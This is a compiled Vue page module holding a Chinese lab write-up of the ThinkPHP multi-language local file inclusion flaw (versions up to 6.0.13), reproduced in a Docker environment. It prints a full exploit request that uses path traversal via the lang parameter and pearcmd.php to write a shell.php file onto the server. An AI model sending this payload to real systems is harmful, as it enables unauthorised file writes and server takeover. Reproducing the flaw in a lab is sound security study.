import{_ as t}from"./plugin-vue_export-helper-c27b6911.js";import{r as l,o as c,c as o,a as e,b as a,d as n,e as r}from"./app-58e4a7d6.js";const p={},d=e("h2",{id:"漏洞描述",tabindex:"-1"},[e("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),a(" 漏洞描述")],-1),s=e("p",null,[a("ThinkPHP 是一个在中国使用较多的 PHP 框架。在其 6.0.13 版本及以前，存在一处本地文件包含漏洞。当多语言特性被开启时，攻击者可以使用 "),e("code",null,"lang"),a(" 参数来包含任意 PHP 文件。")],-1),h=e("p",null,[a("虽然只能包含本地 PHP 文件，但在开启了 "),e("code",null,"register_argc_argv"),a(" 且安装了 pcel/pear 的环境下，可以包含 "),e("code",null,"/usr/local/lib/php/pearcmd.php"),a(" 并写入任意文件。")],-1),g=e("p",null,"参考链接：",-1),u={href:"https://tttang.com/archive/1865/",target:"_blank",rel:"noopener noreferrer"},m={href:"https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp",target:"_blank",rel:"noopener noreferrer"},_=e("code",null,"pearcmd.php",-1),b=r(`<h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><p>Vulhub 执行如下命令启动一个使用 ThinkPHP 6.0.12 版本开发的 Web 应用：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker-compose up -d
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>环境启动后，访问 <code>http://your-ip:8080</code> 即可查看到 ThinkPHP 默认的欢迎页面。</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20230504110841526.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h2 id="漏洞利用" tabindex="-1"><a class="header-anchor" href="#漏洞利用" aria-hidden="true">#</a> 漏洞利用</h2><p>首先，ThinkPHP 多语言特性不是默认开启的，所以我们可以尝试包含 <code>public/index.php</code> 文件来确认文件包含漏洞是否存在：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20230504111549577.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>如果漏洞存在，则服务器会出错，返回 500 页面。</p><p>文件包含漏洞存在的情况下还需要服务器满足下面两个条件才能利用：</p><ol><li>PHP 环境开启了 <code>register_argc_argv</code></li><li>PHP 环境安装了 pcel/pear</li></ol><p>Docker 默认的 PHP 环境恰好满足上述条件，所以我们可以直接使用下面这个数据包来在写 <code>shell.php</code> 文件：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>GET /?+config-create+/&amp;lang=../../../../../../../../../../../usr/local/lib/php/pearcmd&amp;/&lt;?=phpinfo()?&gt;+shell.php HTTP/1.1
Host: localhost:8080
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36
Connection: close
Cache-Control: max-age=0
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>如果服务器返回 pearcmd 的命令行执行结果，说明漏洞利用成功：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20230504111600929.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>此时访问 <code>http://your-ip:8080/shell.php</code> 即可发现已经成功写入文件：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20230504111609053.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,17);function f(v,P){const i=l("ExternalLinkIcon");return c(),o("div",null,[d,s,h,g,e("ul",null,[e("li",null,[e("a",u,[a("https://tttang.com/archive/1865/"),n(i)])]),e("li",null,[e("a",m,[a("https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp"),n(i)]),a(" （本文介绍了 "),_,a(" 利用技巧的原理）")])]),b])}const T=t(p,[["render",f],["__file","ThinkPHP 多语言本地文件包含漏洞.html.vue"]]);export{T as default};
